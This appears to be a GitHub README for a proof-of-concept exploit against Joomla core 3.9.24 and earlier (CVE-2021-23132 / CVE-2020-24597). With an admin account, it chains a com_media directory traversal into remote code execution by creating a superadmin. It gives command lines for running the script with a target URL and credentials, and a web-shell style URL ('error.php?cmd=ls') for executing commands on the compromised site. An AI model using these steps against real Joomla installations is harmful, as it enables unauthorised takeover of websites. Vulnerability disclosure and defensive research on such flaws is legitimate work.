# CVE-2021-23132
com_media allowed paths that are not intended for image uploads to RCE.

# CVE-2020-24597
Directory traversal in com_media to RCE

Two CVEs are the same.

PoC (Full)

Affected version: Joomla core <=3.9.24

User requirement: Admin account (Not Superadmin)

Gain access: Create superadmin, then trigger RCE.

Remote Code Execution (RCE) in Joomla

Run `cve-2021-23132.py` with your credentials and access link rce:

`http://target/templates/protostar/error.php?cmd=ls `

PoC:
 ```
 python3 cve-2021-23132.py -url http://192.168.72.140 -u admin -p 1234  -rce 1 -cmd ls
 ```

![image](https://user-images.githubusercontent.com/24661746/109748558-a898c200-7c0b-11eb-865f-ed903f23b4d9.png)

I wrote PoC to be able to use `Directory Traversal` or RCE mode.

I used `Directory Traversal` to trigger RCE.

You can use `python3 cve-2021-23132.py -h` to how to use PoC.

Note: Make sure you used python3 and install `lmxl` by `pip3 install lxml`

# DISCLAIMER

*Please use your research and help Joomla more secure.*

# References

https://developer.joomla.org/security-centre/846-20210306-core-com-media-allowed-paths-that-are-not-intended-for-image-uploads.html
